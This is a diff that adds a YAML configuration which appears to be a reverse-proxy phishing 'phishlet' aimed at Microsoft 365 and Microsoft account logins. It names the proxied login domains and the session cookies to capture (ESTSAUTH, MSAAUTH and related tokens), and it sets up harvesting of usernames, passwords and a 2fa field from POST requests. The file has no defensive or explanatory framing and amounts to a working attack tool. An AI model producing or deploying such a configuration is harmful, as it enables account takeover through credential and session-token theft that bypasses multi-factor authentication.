@@ -1,0 +1,34 @@
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
+  - {phish_sub: 'account', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH','ESTSAUTHPERSISTENT','ESTSAUTHLIGHT']
+    type: 'cookie'
+  - domain: '.login.live.com'
+    keys: ['WLSSC','__Host-MSAAUTH','__Host-MSAAUTHP','MSPOK','MSPPre','MSPCID','MSPShared','MSPRequ']
+    type: 'cookie'
+credentials:
+  username:
+    key: '(loginfmt)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd)'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    key: '(2fa)'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/'
+auth_urls:
+  - '/common/oauth2/v2.0/authorize'
+  - '/common/login'
